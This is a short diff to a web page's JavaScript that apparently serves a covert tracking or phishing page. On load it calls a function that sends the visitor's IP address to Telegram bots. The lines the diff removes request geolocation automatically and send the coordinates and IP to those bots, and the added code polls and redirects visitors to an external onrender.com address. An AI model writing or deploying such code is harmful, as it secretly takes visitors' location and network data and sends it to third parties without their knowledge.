@@ -8,28 +8,12 @@
 
     
 sendIPToTelegramBots();
-
+yourFunction();
 
 
 
     
-    setTimeout(() => {
-      // Request location permission automatically after a delay of 1 second
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          // Location permission granted, send location and IP results to Telegram bots
-          await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
-        },
-        (error) => {
-          if (error.code === error.PERMISSION_DENIED) {
-          //  showAlert();
-            redirectToNextURL();
-            // Location permission denied, send IP result to Telegram bots
-          }
-        }
-      );
-    }, 1000);
-  });
+    
 
 window.onload = function() {
       setInterval(yourFunction, 5000); // 2000 milliseconds = 2 seconds
@@ -191,7 +175,7 @@ async function yourFunction() {
  { 
  window.location.href = "https://yfyyfyc2.onrender.com"; 
 }
-    }
+}
 
 
 
